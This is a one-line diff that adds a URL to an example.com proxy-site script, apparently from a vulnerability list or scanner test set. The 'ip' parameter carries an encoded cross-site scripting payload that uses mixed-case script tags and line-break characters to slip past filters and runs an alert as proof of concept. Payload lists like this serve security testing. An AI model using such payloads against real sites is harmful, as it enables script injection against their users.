@@ -1,0 +1,2 @@
+http://www.example.com/proxysite/index.php?act=whois&amp;ip=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(319788800356)%3B&lt;/ScRiPt&gt;
+
